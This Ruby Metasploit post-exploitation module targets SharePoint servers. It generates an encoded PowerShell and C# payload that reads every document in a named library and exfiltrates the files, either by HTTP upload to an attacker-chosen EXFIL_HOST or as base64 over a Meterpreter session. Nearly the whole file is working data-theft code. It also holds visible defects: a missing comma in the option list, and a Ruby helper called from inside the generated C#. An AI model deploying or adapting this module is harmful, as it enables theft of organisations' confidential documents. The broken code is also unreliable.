# frozen_string_literal: true

# Gathers documents from a SharePoint library using the .NET API.
# Supports HTTP and Meterpreter exfiltration with size filtering.
class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Windows::Powershell
  include Msf::Module::Stability
  include Msf::Module::SideEffects
  Rank = NormalRanking

  def initialize(info = {})
    super(update_info(info, metadata))
    register_module_options
  end

  def metadata
    {
      'Name' => name,
      'Description' => description,
      'Author' => ['Vikram Verma'],
      'License' => MSF_LICENSE,
      'Platform' => 'win',
      'Arch' => ARCH_X86,
      'Notes' => notes
    }
  end

  def name
    'SharePoint Document Library Enumerator and Extractor'
  end

  def description
    <<~DESC
      Enumerates and extracts documents from a specified SharePoint library using the
      SharePoint .NET API. Designed to run in an existing Windows session (e.g., Meterpreter)
      on a SharePoint server. Supports exfiltration via HTTP or Meterpreter channels,
      with configurable filters for file size and library targeting. Requires execution
      in a context with access to SharePoint assemblies and appropriate permissions.
    DESC
  end

  def notes
    {
      'Stability' => ['crash-safe'],
      'Reliability' => ['repeatable-session'],
      'SideEffects' => ['network-traffic']
    }
  end

  def register_module_options
    register_options([
      OptString.new('SITE_URL', [true, 'Full URL of the SharePoint site', 'http://sharepoint.local']),
      OptString.new('LIBRARY', [true, 'Target document library name', 'Documents']),
       OptEnum.new('EXFIL_METHOD', [ true, 'Exfiltration method (HTTP or METERPRETER)', 'METERPRETER', ['HTTP', 'METERPRETER']])

      OptString.new('EXFIL_HOST', [false, 'Host for HTTP exfiltration', '']),
      OptInt.new('EXFIL_PORT', [false, 'Port for HTTP exfiltration', 8080]),
      OptInt.new('MAX_SIZE', [true, 'Max file size to exfiltrate (bytes)', 10_485_760]) # 10MB
    ])
  end

  def check
    return Exploit::CheckCode::Safe('Target is not a Windows system') unless session.platform == 'windows'

    Exploit::CheckCode::Appears('Module ready to run on Windows session')
  end

  def run

    handle_exfiltration_config
    execute_payload
  end

  def execute_payload
    print_status('Generating SharePoint document extractor payload...')
    encoded_cmd = generate_psh_payload(build_ps_payload, arch: 'x86', encode: true)
    print_status("Executing payload on target session #{session.sid}...")
    output = execute_command(encoded_cmd)
    process_output(output) if output
    print_status('Check session output manually for results.') unless session.type == 'meterpreter'
  end

  def execute_command(encoded_cmd)
    if session.type == 'meterpreter'
      session.shell_command("powershell.exe -EncodedCommand #{encoded_cmd}")
    else
      session.shell_write("powershell.exe -EncodedCommand #{encoded_cmd}\n")
    end
  end

  def build_ps_payload
    <<~PS
      try {
        Add-Type -TypeDefinition @"
        #{build_dotnet_code}
        "@ -ReferencedAssemblies "Microsoft.SharePoint.dll","System.Web.dll" -ErrorAction Stop
        [SharePointExtractor]::ExtractDocs('#{datastore['SITE_URL']}', '#{datastore['LIBRARY']}',
          '#{datastore['EXFIL_METHOD']}', '#{datastore['EXFIL_HOST']}', #{datastore['EXFIL_PORT']},
          #{datastore['MAX_SIZE']})
      } catch {
        Write-Output "FATAL:AssemblyLoadError:" + $_.Exception.Message
      }
    PS
  end

  def build_dotnet_code
    <<~CSHARP
      using Microsoft.SharePoint;
      using System;
      using System.IO;
      using System.Net;

      public class SharePointExtractor {
        public static void ExtractDocs(string site_url, string library_name, string exfil_method, string exfil_host, int exfil_port, long max_size) {
          try {
            using (SPSite site = new SPSite(site_url)) {
              using (SPWeb web = site.OpenWeb()) {
                SPList list = get_library(web, library_name);
                if (list == null) return;
                #{extract_library_logic}
              }
            }
          } catch (Exception e) {
            Console.WriteLine("FATAL:GeneralError:" + e.Message);
          }
        }
      }
    CSHARP
  end

  def get_library(web, library_name)
    web.Lists[library_name]
  rescue StandardError
    print_error("Library not found: #{library_name}")
    nil
  end

  def extract_library_logic
    <<~CSHARP
      SPDocumentLibrary library = list as SPDocumentLibrary;
      if (library == null) {
        Console.WriteLine("ERROR:NotADocumentLibrary:" + library_name);
        return;
      }
      Console.WriteLine("INFO:Enumerating:" + library_name + ":" + library.Items.Count + " items");
      foreach (SPListItem item in library.Items) {
        try {
          SPFile file = item.File;
          if (file.Length > max_size) {
            Console.WriteLine("SKIP:SizeExceeded:" + file.Name + ":" + file.Length);
            continue;
          }
          byte[] file_bytes = file.OpenBinary();
          string file_name = file.Name;
          #{exfiltrate_file(file_name: 'file_name', file_bytes: 'file_bytes')}
        } catch (Exception ex) {
          Console.WriteLine("ERROR:FileProcessing:" + item.Name + ":" + ex.Message);
        }
      }
    CSHARP
  end

  def exfiltrate_file(file_name:, file_bytes:)
    if datastore['EXFIL_METHOD'].upcase == 'HTTP' && !datastore['EXFIL_HOST'].empty?
      http_exfil(file_name, file_bytes)
    else
      meterpreter_exfil(file_name, file_bytes)
    end
  end

  def http_exfil(file_name, file_bytes)
    <<~CSHARP
      using (WebClient client = new WebClient()) {
        client.Headers.Add("X-Filename", #{file_name});
        client.UploadData("http://" + exfil_host + ":" + exfil_port + "/upload", #{file_bytes});
        Console.WriteLine("SUCCESS:HTTP:" + #{file_name} + ":" + #{file_bytes}.Length);
      }
    CSHARP
  end

  def meterpreter_exfil(file_name, file_bytes)
    <<~CSHARP
      string b64 = Convert.ToBase64String(#{file_bytes});
      Console.WriteLine("FILE:" + #{file_name} + ":" + b64);
    CSHARP
  end

  def handle_exfiltration_config
    method = datastore['EXFIL_METHOD'].upcase
    if method == 'HTTP' && datastore['EXFIL_HOST'].to_s.empty?
      fail_with(Failure::BadConfig,
                'EXFIL_HOST required for HTTP exfiltration')
    end
    if method == 'METERPRETER' && session.type != 'meterpreter'
      fail_with(Failure::BadConfig,
                'METERPRETER exfiltration requires a Meterpreter session')
    end

    print_status("Exfiltration method: #{method}")
  end

  def process_output(output)
    return unless output&.empty? == false

    output.split("\n").each { |line| handle_output_line(line) }
  end

  def handle_output_line(line)
    case line
    when /^FILE:([^:]+):(.*)$/ then save_file(Regexp.last_match(1), Regexp.last_match(2))
    when /^SUCCESS:HTTP:([^:]+):(\d+)$/ then log_http_success(Regexp.last_match(1), Regexp.last_match(2))
    when /^ERROR:(.+)$/ then print_error("Error: #{Regexp.last_match(1)}")
    when /^INFO:(.+)$/ then print_status("Info: #{Regexp.last_match(1)}")
    when /^SKIP:(.+)$/ then print_warning("Skipped: #{Regexp.last_match(1)}")
    when /^FATAL:(.+)$/ then fail_with(Failure::Unknown, "Fatal error: #{Regexp.last_match(1)}")
    end
  end

  def log_http_success(file_name, bytes)
    print_good("Exfiltrated #{file_name} via HTTP (#{bytes} bytes)")
  end

  def save_file(file_name, b64_data)
    file_path = store_loot('sharepoint.document', 'application/octet-stream', session,
                           Rex::Text.decode_base64(b64_data), file_name)
    print_good("Saved #{file_name} to #{file_path}")
  end
end
